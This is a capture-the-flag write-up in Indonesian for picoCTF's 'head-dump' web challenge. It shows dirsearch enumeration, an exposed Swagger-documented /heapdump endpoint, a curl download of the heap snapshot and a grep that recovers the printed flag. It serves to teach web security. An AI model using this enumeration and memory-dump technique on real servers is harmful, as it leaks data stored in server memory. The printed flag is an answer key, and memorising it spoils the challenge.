# head-dump

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2025 |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Easy |
| Status | Solved |

## Deskripsi

Challenge ini menyediakan sebuah aplikasi web berbentuk blog. Tujuannya adalah menemukan
endpoint yang mengekspos file berisi data dari memory server, kemudian mencari flag yang
tersembunyi di dalam file tersebut.

## Informasi Awal

Instance challenge yang digunakan adalah:

```text
http://verbal-sleep.picoctf.net:49709
```

Hint yang tersedia:

- `Explore backend development with us`
- `The head was dumped.`

Halaman utama menampilkan beberapa artikel dan tautan menuju halaman `About Us`, `Services`,
serta dokumentasi API. Dokumentasi tersebut menggunakan Swagger UI dan menampilkan API
bernama `picoCTF News API` versi `1.0.0` dengan spesifikasi `OAS 3.0`.

## Tools

- Firefox
- `dirsearch`
- Swagger UI
- Terminal Linux
- `cat`
- `grep`

## Analisis

Enumerasi direktori menemukan endpoint `/heapdump` yang merespons dengan file berukuran
sekitar 11 MB. Endpoint tersebut juga tercantum pada dokumentasi Swagger di bagian
`Diagnosing` dengan keterangan `Diagnosing the memory allocation.`

Respons endpoint berupa file heap snapshot dengan content type `application/octet-stream`.
Karena heap snapshot dapat memuat string yang masih berada di memory aplikasi, file tersebut
kemudian dicari menggunakan string `picoCTF`.

## Langkah Penyelesaian

### 1. Membuka instance challenge

Instance dibuka melalui Firefox pada alamat berikut:

```text
http://verbal-sleep.picoctf.net:49709
```

Aplikasi menampilkan website blog bernama `picoCTF News`. Beberapa halaman yang terlihat
adalah `/about` dan `/services`.

### 2. Melakukan enumerasi endpoint

Enumerasi dilakukan menggunakan `dirsearch` dengan command berikut:

```bash
dirsearch -u http://verbal-sleep.picoctf.net:49709/
```

Beberapa hasil penting dari enumerasi adalah:

```text
200  /About
200  /about
301  /api-docs  -> /api-docs/
301  /img       -> /img/
200  /heapdump
200  /services/
```

Endpoint `/heapdump` menarik perhatian karena mengembalikan file berukuran sekitar 11 MB,
sedangkan `/api-docs` mengarah ke dokumentasi API.

### 3. Memeriksa dokumentasi Swagger

Endpoint berikut dibuka pada browser:

```text
http://verbal-sleep.picoctf.net:49709/api-docs/
```

Pada bagian `Diagnosing` terdapat endpoint:

```http
GET /heapdump
```

Endpoint tersebut tidak memiliki parameter dan memiliki deskripsi `Diagnosing the memory
allocation.`. Swagger UI menyediakan tombol `Try it out` dan `Execute` untuk mengirim request.

### 4. Mengunduh heap snapshot

Swagger UI menghasilkan request berikut:

```bash
curl -X 'GET' \
  'http://verbal-sleep.picoctf.net:49709/heapdump' \
  -H 'accept: */*'
```

Server mengembalikan status `200` dan menyediakan file untuk diunduh. Header respons penting
yang terlihat adalah:

```http
content-disposition: attachment; filename="heapdump-1787327135914.heapsnapshot"
content-length: 10975066
content-type: application/octet-stream
```

File tersebut disimpan sebagai:

```text
heapdump-1787327135914.heapsnapshot
```

### 5. Mencari flag di dalam heap snapshot

Setelah berpindah ke direktori `Downloads`, isi file dicari menggunakan `grep`:

```bash
cat heapdump-1787327135914.heapsnapshot | grep "picoCTF"
```

Command tersebut menemukan string flag pada isi heap snapshot:

```text
picoCTF{3nt_15_Th3_K3y_546786ba}
```

## Flag

```text
picoCTF{3nt_15_Th3_K3y_546786ba}
```

## Pembelajaran

- Dokumentasi API yang terekspos dapat membantu menemukan endpoint yang tidak terlihat dari
  navigasi utama aplikasi.
- Endpoint diagnostik yang mengembalikan heap snapshot dapat membocorkan data yang masih
  tersimpan di memory server.
- File berukuran besar dapat diproses dengan pencarian string sederhana menggunakan `grep`
  ketika formatnya mengandung data teks.
- Endpoint diagnostik seharusnya tidak diekspos tanpa autentikasi dan kontrol akses yang
  sesuai.
